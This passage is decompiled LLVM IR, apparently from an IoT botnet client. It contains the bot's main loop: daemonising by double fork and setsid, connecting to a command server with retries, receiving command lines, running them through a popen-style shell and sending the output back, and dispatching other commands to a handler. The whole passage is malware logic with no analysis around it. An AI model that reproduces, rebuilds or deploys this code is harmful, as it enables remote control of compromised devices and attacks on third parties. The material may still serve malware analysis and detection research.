  %v2_e884 = icmp eq i32 %v3_e87c, 0
  br i1 %v2_e884, label %dec_label_pc_e88c, label %dec_label_pc_e898

dec_label_pc_e88c:                                ; preds = %dec_label_pc_e848
  %v1_e890 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e898.outer

dec_label_pc_e898.outer:                          ; preds = %dec_label_pc_e88c, %dec_label_pc_e810
  %stack_var_-80.0.ph = phi i32 [ %v1_e890, %dec_label_pc_e88c ], [ 0, %dec_label_pc_e810 ]
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_e898.outer, %dec_label_pc_e848
  %v2_e89c = call i32 @feof(i8* %v1_e89c)
  %v2_e8a4 = icmp eq i32 %v2_e89c, 0
  br i1 %v2_e8a4, label %dec_label_pc_e848, label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e898
  %v2_e8b0 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e8bc = call i32 @__GI_fclose(i8* %v1_e89c)
  br i1 %v2_e8b0, label %dec_label_pc_e8b8, label %dec_label_pc_e910

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e8ac
  %v4_e8c0 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e8c0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_199cc.554 to i32), i32* @r1, align 4
  %v3_e8c8 = call i32 @__GI_fopen(i32 %v4_e8c0, i32 ptrtoint (i32* @global_var_199cc.554 to i32))
  %v2_e8d8 = icmp eq i32 %v3_e8c8, 0
  br i1 %v2_e8d8, label %dec_label_pc_e910, label %dec_label_pc_e8e0

dec_label_pc_e8e0:                                ; preds = %dec_label_pc_e8b8
  %v2_e8ec = call i32 @__GI_fputs(i32 %v2_e82c, i32 %v3_e8c8)
  %v1_e8f4 = inttoptr i32 %v3_e8c8 to i8*
  %v2_e8f4 = call i32 @__GI_fclose(i8* %v1_e8f4)
  br label %dec_label_pc_e910

dec_label_pc_e908:                                ; preds = %dec_label_pc_e780
  %v1_e90c = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e90c = call i32 @__GI_fclose(i8* %v1_e90c)
  br label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %dec_label_pc_e8ac, %dec_label_pc_e8b8, %dec_label_pc_e774, %dec_label_pc_e8e0, %dec_label_pc_e908
  %v0_e910 = call i32 @getOurIP()
  %v0_e914 = call i32 @__libc_fork()
  %v2_e924 = icmp eq i32 %v0_e914, 0
  br i1 %v2_e924, label %dec_label_pc_e954, label %dec_label_pc_e990

dec_label_pc_e954:                                ; preds = %dec_label_pc_e910
  %v0_e954 = call i32 @__libc_fork()
  %v2_e964 = icmp eq i32 %v0_e954, 0
  br i1 %v2_e964, label %dec_label_pc_e974.thread, label %dec_label_pc_e980

dec_label_pc_e974.thread:                         ; preds = %dec_label_pc_e954
  br label %dec_label_pc_e99c

dec_label_pc_e980:                                ; preds = %dec_label_pc_e954
  %v1_e970 = call i32 @__GI_exit(i32 0)
  %v2_e988 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_199d0.556 to i32))
  br label %dec_label_pc_e99c

dec_label_pc_e990:                                ; preds = %dec_label_pc_e910
  %v2_e92c = ptrtoint i32* %stack_var_-112 to i32
  %v3_e93c = call i32 @__libc_waitpid(i32 %v0_e914, i32 %v2_e92c, i32 0)
  %v1_e944 = call i32 @__GI_exit(i32 0)
  %v2_e998 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_199d0.556 to i32))
  br label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e974.thread, %dec_label_pc_e980, %dec_label_pc_e990
  %v0_e99c = call i32 @__GI_setsid()
  %v0_e9a4 = call i32 @chdir()
  %v2_e9b0 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_f254 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f264 = bitcast i32* %stack_var_-5744 to i8*
  %v2_ecfc = add i32 %v19_e62c, -5720
  %v2_efbc = ptrtoint i32* %stack_var_-1648 to i32
  %v2_efcc = bitcast i32* %stack_var_-1648 to i8*
  %v1_ee40 = or i32 %v2_f254, 1
  %v5_ee44 = inttoptr i32 %v1_ee40 to i8*
  %v2_ee60 = or i32 %v2_f254, 2
  %v2_f120 = add i32 %v19_e62c, -600
  br label %dec_label_pc_e9b8.outer

dec_label_pc_e9b8.outer:                          ; preds = %dec_label_pc_ed98, %dec_label_pc_f244, %dec_label_pc_e99c
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_e99c ], [ %stack_var_-96.2.ph, %dec_label_pc_f244 ], [ %v1_ed9c, %dec_label_pc_ed98 ]
  %v0_e9b824 = call i32 @initConnection()
  %v2_e9c026 = icmp eq i32 %v0_e9b824, 0
  br i1 %v2_e9c026, label %dec_label_pc_e9d4, label %dec_label_pc_e9c8

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e9b8.outer, %dec_label_pc_e9c8
  %v1_e9cc = call i32 @sleep(i32 30)
  %v0_e9b8 = call i32 @initConnection()
  %v2_e9c0 = icmp eq i32 %v0_e9b8, 0
  br i1 %v2_e9c0, label %dec_label_pc_e9d4, label %dec_label_pc_e9c8

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9c8, %dec_label_pc_e9b8.outer
  %v2_e9d8 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_e9d8, i32* @r5, align 4
  %v2_e9e0 = load i32, i32* @global_var_29da8.81, align 4
  store i32 %v2_e9e0, i32* @r0, align 4
  %v1_e9e4 = call i32 @__GI_inet_ntoa(i32 %v2_e9e0)
  store i32 %v1_e9e4, i32* @r4, align 4
  %v0_e9ec = call i32 @getBuild()
  %v0_e9f4 = load i32, i32* @r5, align 4
  %v0_e9fc = load i32, i32* @r4, align 4
  store i32 %v0_e9fc, i32* @r2, align 4
  %v2_ea00 = call i32 @Rootsprintf(i32 %v0_e9f4, i32 ptrtoint (i32* @global_var_199e0.560 to i32))
  br label %dec_label_pc_f244.outer

dec_label_pc_ea24:                                ; preds = %dec_label_pc_ecd4, %dec_label_pc_ec80
  %v3_ea28 = mul i32 %v3_ecc8, 4
  %v2_ea34 = load i32, i32* @global_var_29db4.70, align 4
  %v2_ea38 = add i32 %v2_ea34, %v3_ea28
  %v1_ea3c = inttoptr i32 %v2_ea38 to i32*
  %v2_ea3c = load i32, i32* %v1_ea3c, align 4
  %v3_ea4c = call i32 @__libc_waitpid(i32 %v2_ea3c, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_ea4c, 1
  br i1 %tmp111, label %dec_label_pc_ec74, label %dec_label_pc_eab4

dec_label_pc_ea6c:                                ; preds = %dec_label_pc_eb10, %dec_label_pc_eab4
  %v3_ea70 = mul i32 %v1_ea60, 4
  %v2_ea7c = load i32, i32* @global_var_29db4.70, align 4
  %v2_ea80 = add i32 %v2_ea7c, %v3_ea70
  %v1_ea84 = add i32 %v2_ea80, -4
  %v1_eaa0 = inttoptr i32 %v2_ea80 to i32*
  %v2_eaa0 = load i32, i32* %v1_eaa0, align 4
  %v2_eaa4 = inttoptr i32 %v1_ea84 to i32*
  store i32 %v2_eaa0, i32* %v2_eaa4, align 4
  br label %dec_label_pc_eab4

dec_label_pc_eab4:                                ; preds = %dec_label_pc_ea24, %dec_label_pc_ea6c
  %v3_ea5c.sink = phi i32 [ %v1_ea60, %dec_label_pc_ea6c ], [ %v3_ecc8, %dec_label_pc_ea24 ]
  %v1_ea60 = add i32 %v3_ea5c.sink, 1
  %v2_ead0 = load i32, i32* @global_var_23b30.67, align 4
  %v5_ead0 = load i32, i32* @global_var_23b34.68, align 4
  %tmp112 = icmp ugt i32 %v5_ead0, %v1_ea60
  br i1 %tmp112, label %dec_label_pc_ea6c, label %dec_label_pc_eaf8

dec_label_pc_eaf8:                                ; preds = %dec_label_pc_eab4
  %v9_eb08 = icmp eq i32 %v5_ead0, %v1_ea60
  br i1 %v9_eb08, label %dec_label_pc_eb10, label %dec_label_pc_eb28

dec_label_pc_eb10:                                ; preds = %dec_label_pc_eaf8
  %v9_eb20 = icmp eq i32 %v2_ead0, 0
  br i1 %v9_eb20, label %dec_label_pc_eb28, label %dec_label_pc_ea6c

dec_label_pc_eb28:                                ; preds = %dec_label_pc_eb10, %dec_label_pc_eaf8
  %v3_eb2c = mul i32 %v1_ea60, 4
  %v2_eb38 = load i32, i32* @global_var_29db4.70, align 4
  %v2_eb3c = add i32 %v3_eb2c, -4
  %v1_eb40 = add i32 %v2_eb3c, %v2_eb38
  %v2_eb48 = inttoptr i32 %v1_eb40 to i32*
  store i32 0, i32* %v2_eb48, align 4
  %v2_eb50 = load i32, i32* @global_var_23b30.67, align 4
  %v5_eb50 = load i32, i32* @global_var_23b34.68, align 4
  %v2_eb5c = add i32 %v2_eb50, -1
  %v3_eb5c = icmp ne i32 %v2_eb50, 0
  %v3_eb60 = add i32 %v5_eb50, -1
  %v4_eb60 = zext i1 %v3_eb5c to i32
  %v5_eb60 = add i32 %v3_eb60, %v4_eb60
  store i32 %v2_eb5c, i32* @global_var_23b30.67, align 4
  store i32 %v5_eb60, i32* @global_var_23b34.68, align 4
  %v3_eb74 = udiv i32 %v2_eb5c, 1073741824
  %v3_eb78 = mul i32 %v5_eb60, 4
  %v2_eb7c = or i32 %v3_eb78, %v3_eb74
  store i32 %v2_eb7c, i32* @r4, align 4
  %v3_eb80 = mul i32 %v2_eb5c, 4
  %v1_eb84 = add i32 %v3_eb80, 4
  %v1_eb8c = call i32 @malloc(i32 %v1_eb84)
  br label %dec_label_pc_ebe4

dec_label_pc_eba4:                                ; preds = %dec_label_pc_ec40, %dec_label_pc_ebe4
  %v3_eba8 = mul i32 %v3_ec34, 4
  %v2_ebb4 = add i32 %v3_eba8, %v1_eb8c
  %v2_ebc8 = load i32, i32* @global_var_29db4.70, align 4
  %v2_ebcc = add i32 %v2_ebc8, %v3_eba8
  %v1_ebd0 = inttoptr i32 %v2_ebcc to i32*
  %v2_ebd0 = load i32, i32* %v1_ebd0, align 4
  %v2_ebd4 = inttoptr i32 %v2_ebb4 to i32*
  store i32 %v2_ebd0, i32* %v2_ebd4, align 4
  %v1_ebdc = add i32 %v3_ec34, 1
  br label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_eb28, %dec_label_pc_eba4
  %v3_ec34 = phi i32 [ 0, %dec_label_pc_eb28 ], [ %v1_ebdc, %dec_label_pc_eba4 ]
  %v2_ec00 = load i32, i32* @global_var_23b30.67, align 4
  %v5_ec00 = load i32, i32* @global_var_23b34.68, align 4
  %tmp113 = icmp ugt i32 %v5_ec00, %v3_ec34
  br i1 %tmp113, label %dec_label_pc_eba4, label %dec_label_pc_ec28

dec_label_pc_ec28:                                ; preds = %dec_label_pc_ebe4
  %v9_ec38 = icmp eq i32 %v5_ec00, %v3_ec34
  br i1 %v9_ec38, label %dec_label_pc_ec40, label %dec_label_pc_ec58

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec28
  %v9_ec50 = icmp eq i32 %v2_ec00, 0
  br i1 %v9_ec50, label %dec_label_pc_ec58, label %dec_label_pc_eba4

dec_label_pc_ec58:                                ; preds = %dec_label_pc_ec40, %dec_label_pc_ec28
  %v2_ec5c = load i32, i32* @global_var_29db4.70, align 4
  store i32 %v2_ec5c, i32* @r0, align 4
  %v0_ec64 = call i32 @free()
  store i32 %v1_eb8c, i32* @global_var_29db4.70, align 4
  br label %dec_label_pc_ec74

dec_label_pc_ec74:                                ; preds = %dec_label_pc_ea24, %dec_label_pc_ec58
  %v1_ec78 = add i32 %v3_ecc8, 1
  br label %dec_label_pc_ec80

dec_label_pc_ec80:                                ; preds = %dec_label_pc_f244, %dec_label_pc_ec74
  %v3_ecc8 = phi i32 [ %v1_ec78, %dec_label_pc_ec74 ], [ 0, %dec_label_pc_f244 ]
  %v3_ec88 = ashr i32 %v3_ecc8, 31
  %v2_ec98 = load i32, i32* @global_var_23b30.67, align 4
  %v5_ec98 = load i32, i32* @global_var_23b34.68, align 4
  %v3_ecb4 = icmp uge i32 %v5_ec98, %v3_ecc8
  %v9_ecb4 = icmp eq i32 %v5_ec98, %v3_ecc8
  %v2_ecb8 = xor i1 %v9_ecb4, true
  %v3_ecb8 = and i1 %v3_ecb4, %v2_ecb8
  br i1 %v3_ecb8, label %dec_label_pc_ea24, label %dec_label_pc_ecbc

dec_label_pc_ecbc:                                ; preds = %dec_label_pc_ec80
  br i1 %v9_ecb4, label %dec_label_pc_ecd4, label %dec_label_pc_ecec

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecbc
  %tmp = icmp ugt i32 %v2_ec98, %v3_ec88
  br i1 %tmp, label %dec_label_pc_ea24, label %dec_label_pc_ecec

dec_label_pc_ecec:                                ; preds = %dec_label_pc_ecbc, %dec_label_pc_ecd4
  %v2_ed00 = add i32 %v2_ecfc, %v5_f264
  %v3_ed00 = inttoptr i32 %v2_ed00 to i8*
  store i8 0, i8* %v3_ed00, align 1
  %v2_ed1c = call i32 @trim(i8* %v4_f264)
  %v9_ed34 = call i32 @strstr(i32 %v2_f254, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19438.51, i32 0, i32 0), i32 %v2_ed00, i32 %v2_f254, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_ed34, i32* @r2, align 4
  %v9_ed48 = icmp eq i32 %v9_ed34, %v2_f254
  br i1 %v9_ed48, label %dec_label_pc_ed50, label %dec_label_pc_ed68

dec_label_pc_ed50:                                ; preds = %dec_label_pc_ecec
  %v2_ed54 = load i32, i32* @global_var_23b28.49, align 4
  %v3_ed60 = call i32 @Rootsprintf(i32 %v2_ed54, i32 ptrtoint ([5 x i8]* @global_var_19a48.565 to i32))
  br label %dec_label_pc_f244

dec_label_pc_ed68:                                ; preds = %dec_label_pc_ecec
  %v8_ed7c = call i32 @strstr(i32 %v2_f254, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19a50.567, i32 0, i32 0), i32 %v9_ed34, i32 %v2_f254, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ed90 = icmp eq i32 %v8_ed7c, %v2_f254
  br i1 %v9_ed90, label %dec_label_pc_ed98, label %dec_label_pc_edc4

dec_label_pc_ed98:                                ; preds = %dec_label_pc_ed68
  %v1_ed9c = add i32 %stack_var_-96.2.ph, 1
  %v2_edac = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_19a5c.569 to i32))
  %v7_edb8 = icmp slt i32 %v1_ed9c, 21
  br i1 %v7_edb8, label %dec_label_pc_e9b8.outer, label %dec_label_pc_edbc

dec_label_pc_edbc:                                ; preds = %dec_label_pc_ed98
  %v1_edc0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_edc4

dec_label_pc_edc4:                                ; preds = %dec_label_pc_ed68, %dec_label_pc_edbc
  %stack_var_-96.1 = phi i32 [ %v1_ed9c, %dec_label_pc_edbc ], [ %stack_var_-96.2.ph, %dec_label_pc_ed68 ]
  %v2_edd8 = load i8, i8* %v4_f264, align 4
  %v7_eddc = icmp eq i8 %v2_edd8, 33
  br i1 %v7_eddc, label %dec_label_pc_ee00, label %dec_label_pc_f244.outer

dec_label_pc_ee00:                                ; preds = %dec_label_pc_edc4, %dec_label_pc_ee10
  %v3_ede4.sink = phi i8* [ %storemerge8, %dec_label_pc_ee10 ], [ %v4_f264, %dec_label_pc_edc4 ]
  %v4_ede4 = ptrtoint i8* %v3_ede4.sink to i32
  %v1_ede8 = add i32 %v4_ede4, 1
  %storemerge8 = inttoptr i32 %v1_ede8 to i8*
  %v2_ee04 = load i8, i8* %storemerge8, align 1
  %v7_ee08 = icmp eq i8 %v2_ee04, 32
  br i1 %v7_ee08, label %dec_label_pc_ee20, label %dec_label_pc_ee10

dec_label_pc_ee10:                                ; preds = %dec_label_pc_ee00
  %v2_ee14 = load i8, i8* %storemerge8, align 1
  %v2_ee18 = icmp eq i8 %v2_ee14, 0
  br i1 %v2_ee18, label %dec_label_pc_ee20, label %dec_label_pc_ee00

dec_label_pc_ee20:                                ; preds = %dec_label_pc_ee10, %dec_label_pc_ee00
  %v2_ee24 = load i8, i8* %storemerge8, align 1
  %v2_ee28 = icmp eq i8 %v2_ee24, 0
  br i1 %v2_ee28, label %dec_label_pc_f244.outer, label %dec_label_pc_ee30

dec_label_pc_ee30:                                ; preds = %dec_label_pc_ee20
  store i8 0, i8* %storemerge8, align 1
  %v3_ee50 = call i32 @strlen(i8* %v5_ee44)
  %v1_ee64 = add i32 %v3_ee50, %v2_ee60
  %v5_ee68 = inttoptr i32 %v1_ee64 to i8*
  %v2_eeb0 = add i32 %v1_ee64, -1
  br label %dec_label_pc_ee98

dec_label_pc_ee70:                                ; preds = %dec_label_pc_eec4, %dec_label_pc_ee98
  %v3_ee78 = call i32 @strlen(i8* %v5_ee68)
  %v1_ee8c = add i32 %v2_eeb0, %v3_ee78
  %v3_ee94 = inttoptr i32 %v1_ee8c to i8*
  store i8 0, i8* %v3_ee94, align 1
  br label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee30, %dec_label_pc_ee70
  %v3_eea0 = call i32 @strlen(i8* %v5_ee68)
  %v1_eeb4 = add i32 %v3_eea0, %v2_eeb0
  %v1_eeb8 = inttoptr i32 %v1_eeb4 to i8*
  %v2_eeb8 = load i8, i8* %v1_eeb8, align 1
  %v7_eebc = icmp eq i8 %v2_eeb8, 10
  br i1 %v7_eebc, label %dec_label_pc_ee70, label %dec_label_pc_eec4

dec_label_pc_eec4:                                ; preds = %dec_label_pc_ee98
  %v3_eecc = call i32 @strlen(i8* %v5_ee68)
  %v1_eee0 = add i32 %v3_eecc, %v2_eeb0
  %v1_eee4 = inttoptr i32 %v1_eee0 to i8*
  %v2_eee4 = load i8, i8* %v1_eee4, align 1
  %v7_eee8 = icmp eq i8 %v2_eee4, 13
  br i1 %v7_eee8, label %dec_label_pc_ee70, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %dec_label_pc_eec4
  %v2_ef0c28 = load i8, i8* %v5_ee68, align 1
  %v7_ef1032 = icmp eq i8 %v2_ef0c28, 32
  br i1 %v7_ef1032, label %dec_label_pc_ef28, label %dec_label_pc_ef18

dec_label_pc_eefc:                                ; preds = %dec_label_pc_ef18
  %v1_ef00 = add i32 %v4_ef0834, 1
  %v5_ef04 = inttoptr i32 %v1_ef00 to i8*
  %v2_ef0c = load i8, i8* %v5_ef04, align 1
  %v7_ef10 = icmp eq i8 %v2_ef0c, 32
  br i1 %v7_ef10, label %dec_label_pc_ef28, label %dec_label_pc_ef18

dec_label_pc_ef18:                                ; preds = %dec_label_pc_eef0, %dec_label_pc_eefc
  %v4_ef0834 = phi i32 [ %v1_ef00, %dec_label_pc_eefc ], [ %v1_ee64, %dec_label_pc_eef0 ]
  %stack_var_-64.033 = phi i8* [ %v5_ef04, %dec_label_pc_eefc ], [ %v5_ee68, %dec_label_pc_eef0 ]
  %v2_ef1c = load i8, i8* %stack_var_-64.033, align 1
  %v2_ef20 = icmp eq i8 %v2_ef1c, 0
  br i1 %v2_ef20, label %dec_label_pc_ef28, label %dec_label_pc_eefc

dec_label_pc_ef28:                                ; preds = %dec_label_pc_eefc, %dec_label_pc_ef18, %dec_label_pc_eef0
  %stack_var_-64.0.lcssa = phi i8* [ %v5_ee68, %dec_label_pc_eef0 ], [ %v5_ef04, %dec_label_pc_eefc ], [ %stack_var_-64.033, %dec_label_pc_ef18 ]
  %v4_ef08.lcssa = phi i32 [ %v1_ee64, %dec_label_pc_eef0 ], [ %v1_ef00, %dec_label_pc_eefc ], [ %v4_ef0834, %dec_label_pc_ef18 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_ef38 = add i32 %v4_ef08.lcssa, 1
  %v2_ef7c39 = load i8, i8* %v5_ee68, align 1
  %v2_ef8041 = icmp eq i8 %v2_ef7c39, 0
  br i1 %v2_ef8041, label %dec_label_pc_ef88, label %dec_label_pc_ef4c

dec_label_pc_ef4c:                                ; preds = %dec_label_pc_ef28, %dec_label_pc_ef4c
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_ef4c ], [ %v5_ee68, %dec_label_pc_ef28 ]
  %storemerge1442 = phi i32 [ %v1_ef70, %dec_label_pc_ef4c ], [ %v1_ee64, %dec_label_pc_ef28 ]
  %v2_ef50 = load i8, i8* %storemerge743, align 1
  %v3_ef50 = zext i8 %v2_ef50 to i32
  %v1_ef58 = call i32 @__GI_toupper(i32 %v3_ef50)
  %v1_ef68 = trunc i32 %v1_ef58 to i8
  store i8 %v1_ef68, i8* %storemerge743, align 1
  %v1_ef70 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_ef70 to i8*
  %v2_ef7c = load i8, i8* %storemerge7, align 1
  %v2_ef80 = icmp eq i8 %v2_ef7c, 0
  br i1 %v2_ef80, label %dec_label_pc_ef88, label %dec_label_pc_ef4c

dec_label_pc_ef88:                                ; preds = %dec_label_pc_ef4c, %dec_label_pc_ef28
  store i32 ptrtoint ([11 x i8]* @global_var_19a70.571 to i32), i32* @r1, align 4
  %v4_ef94 = call i32 @__GI_strcoll(i8* %v5_ee68, i32 ptrtoint ([11 x i8]* @global_var_19a70.571 to i32))
  %v2_ef9c = icmp eq i32 %v4_ef94, 0
  br i1 %v2_ef9c, label %dec_label_pc_efa4, label %dec_label_pc_f0ac

dec_label_pc_efa4:                                ; preds = %dec_label_pc_ef88
  %v0_efa4 = call i32 @listFork()
  %v2_efac = icmp eq i32 %v0_efa4, 0
  br i1 %v2_efac, label %dec_label_pc_efb4, label %dec_label_pc_f244.outer

dec_label_pc_efb4:                                ; preds = %dec_label_pc_efa4
  store i32 1024, i32* @r2, align 4
  %v3_efcc = call i32 @__GI_memset(i8* %v2_efcc, i32 0)
  %v11_efec = call i32 @szprintf(i32 %v2_efbc, i32 ptrtoint ([8 x i8]* @global_var_19a7c.573 to i32), i32 %v1_ef38, i32 %v2_efbc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_f008 = call i32 @fdpopen(i32 %v2_efbc, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_199ac.546, i32 0, i32 0))
  br label %dec_label_pc_f074

dec_label_pc_f018:                                ; preds = %dec_label_pc_f074
  %v2_f028 = call i32 @trim(i8* %v2_efcc)
  %v2_f030 = load i32, i32* @global_var_23b28.49, align 4
  store i32 %v2_efbc, i32* @r2, align 4
  %v3_f04c = call i32 @Rootsprintf(i32 %v2_f030, i32 ptrtoint ([3 x i8]* @global_var_19a84.575 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_f068 = call i32 @__GI_memset(i8* %v2_efcc, i32 0)
  %v1_f070 = call i32 @sleep(i32 1)
  br label %dec_label_pc_f074

dec_label_pc_f074:                                ; preds = %dec_label_pc_efb4, %dec_label_pc_f018
  %v4_f08c = call i32 @fdgets(i32 %v2_efbc, i32 1024, i32 %v3_f008, i32 %v2_efbc)
  %v2_f094 = icmp eq i32 %v4_f08c, 0
  br i1 %v2_f094, label %dec_label_pc_f09c, label %dec_label_pc_f018

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f074
  %v1_f0a0 = call i32 @fdpclose(i32 %v3_f008)
  %v1_f0a8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_ef88, %dec_label_pc_f09c
  store i32 %v1_ef38, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19a88.577 to i32), i32* @r1, align 4
  %v2_f0c0 = call i32 @__GI_strtok(i32 %v1_ef38, i32 ptrtoint (i32* @global_var_19a88.577 to i32))
  store i32 %v1_ee64, i32* %stack_var_-624, align 4
  %v2_f1c846 = icmp eq i32 %v2_f0c0, 0
  br i1 %v2_f1c846, label %dec_label_pc_f1d0, label %dec_label_pc_f0d8

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_f0ac, %dec_label_pc_f1b0
  %stack_var_-36.049.in = phi i32 [ %v2_f1b8, %dec_label_pc_f1b0 ], [ %v2_f0c0, %dec_label_pc_f0ac ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f1b0 ], [ 1, %dec_label_pc_f0ac ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_f0dc = load i8, i8* %stack_var_-36.049, align 1
  %v7_f0e0 = icmp eq i8 %v2_f0dc, 10
  br i1 %v7_f0e0, label %dec_label_pc_f1b0, label %dec_label_pc_f0e8

dec_label_pc_f0e8:                                ; preds = %dec_label_pc_f0d8
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_f0f4 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f0fc = add i32 %v3_f0f4, 1
  %v1_f104 = call i32 @malloc(i32 %v1_f0fc)
  %v0_f118 = load i32, i32* @r4, align 4
  %v3_f118 = mul i32 %v0_f118, 4
  %v2_f124 = add i32 %v2_f120, %v3_f118
  %v2_f128 = inttoptr i32 %v2_f124 to i32*
  store i32 %v1_f104, i32* %v2_f128, align 4
  %v3_f138 = mul i32 %stack_var_-40.147, 4
  %v2_f140 = add i32 %v3_f138, %v19_e62c
  %v2_f144 = add i32 %v2_f140, -600
  %v1_f148 = inttoptr i32 %v2_f144 to i32*
  %v2_f148 = load i32, i32* %v1_f148, align 4
  store i32 %v2_f148, i32* @r4, align 4
  %v3_f154 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f15c = add i32 %v3_f154, 1
  %v0_f160 = load i32, i32* @r4, align 4
  store i32 %v1_f15c, i32* @r2, align 4
  %v2_f170 = inttoptr i32 %v0_f160 to i8*
  %v3_f170 = call i32 @__GI_memset(i8* %v2_f170, i32 0)
  %v2_f190 = load i32, i32* %v1_f148, align 4
  %v4_f1a0 = call i32 @strcpy(i32 %v2_f190, i8* nonnull %stack_var_-36.049)
  %v1_f1a8 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f0d8, %dec_label_pc_f0e8
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_f0d8 ], [ %v1_f1a8, %dec_label_pc_f0e8 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19a88.577 to i32), i32* @r1, align 4
  %v2_f1b8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_19a88.577 to i32))
  %v2_f1c8 = icmp eq i32 %v2_f1b8, 0
  br i1 %v2_f1c8, label %dec_label_pc_f1d0, label %dec_label_pc_f0d8

dec_label_pc_f1d0:                                ; preds = %dec_label_pc_f1b0, %dec_label_pc_f0ac
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_f0ac ], [ %stack_var_-40.0, %dec_label_pc_f1b0 ]
  %v3_f1dc = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f1e8 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f1e8, label %dec_label_pc_f244.outer, label %dec_label_pc_f200.lr.ph

dec_label_pc_f200.lr.ph:                          ; preds = %dec_label_pc_f1d0
  br label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f200.lr.ph, %dec_label_pc_f200
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_f200.lr.ph ], [ %v1_f22c, %dec_label_pc_f200 ]
  %v3_f20c = mul i32 %storemerge15127, 4
  %v2_f214 = add i32 %v3_f20c, %v19_e62c
  %v2_f218 = add i32 %v2_f214, -600
  %v1_f21c = inttoptr i32 %v2_f218 to i32*
  %v2_f21c = load i32, i32* %v1_f21c, align 4
  store i32 %v2_f21c, i32* @r0, align 4
  %v0_f224 = call i32 @free()
  %v1_f22c = add nuw nsw i32 %storemerge15127, 1
  %v5_f240 = icmp slt i32 %v1_f22c, %stack_var_-40.1.lcssa
  br i1 %v5_f240, label %dec_label_pc_f200, label %dec_label_pc_f244.outer

dec_label_pc_f244.outer:                          ; preds = %dec_label_pc_f200, %dec_label_pc_edc4, %dec_label_pc_efa4, %dec_label_pc_f1d0, %dec_label_pc_ee20, %dec_label_pc_e9d4
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_e9d4 ], [ %stack_var_-96.1, %dec_label_pc_ee20 ], [ %stack_var_-96.1, %dec_label_pc_f1d0 ], [ %stack_var_-96.1, %dec_label_pc_efa4 ], [ %stack_var_-96.1, %dec_label_pc_edc4 ], [ %stack_var_-96.1, %dec_label_pc_f200 ]
  br label %dec_label_pc_f244

dec_label_pc_f244:                                ; preds = %dec_label_pc_f244.outer, %dec_label_pc_ed50
  %v2_f248 = load i32, i32* @global_var_23b28.49, align 4
  %v5_f264 = call i32 @recvLine(i32 %v2_f248, i8* %v4_f264, i32 4096, i32 %v2_f254)
  %v3_f274 = icmp eq i32 %v5_f264, -1
  br i1 %v3_f274, label %dec_label_pc_e9b8.outer, label %dec_label_pc_ec80

; uselistorder directives
  uselistorder i32 %v5_f264, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f1b8, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
